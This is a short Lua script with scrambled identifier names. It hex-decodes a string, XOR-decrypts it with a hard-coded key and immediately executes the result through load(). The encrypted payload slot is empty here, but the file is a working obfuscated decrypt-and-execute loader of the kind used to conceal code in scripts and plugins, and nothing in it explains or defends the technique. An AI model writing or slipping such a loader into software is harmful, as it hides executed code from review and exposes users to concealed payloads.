
local xaxubprsps = ""
local bftevpzl = {1,243,90,10,13,94,172,161,166,170,147,78,222,149,221,74}

local function vtwzphgryn(a, b)
    local res, c = 0, 1
    while a > 0 or b > 0 do
        local ab, bb = a % 2, b % 2
        if ab ~= bb then res = res + c end
        a, b, c = math.floor(a / 2), math.floor(b / 2), c * 2
    end
    return res
end

local function ytiyfyim(hex, key)
    local function fromhex(str)
        return (str:gsub('..', function(cc) return string.char(tonumber(cc, 16)) end))
    end
    local raw = fromhex(hex)
    local out = {}
    for i = 1, #raw do
        local k = key[(i - 1) % #key + 1]
        out[i] = string.char(vtwzphgryn(raw:byte(i), k))
    end
    return table.concat(out)
end

local function bdfggmdnwq(code)
    local f = load(code)
    if f then f() end
end

local function cqedrmo()
    local decrypted = ytiyfyim(xaxubprsps, bftevpzl)
    bdfggmdnwq(decrypted)
end

cqedrmo()
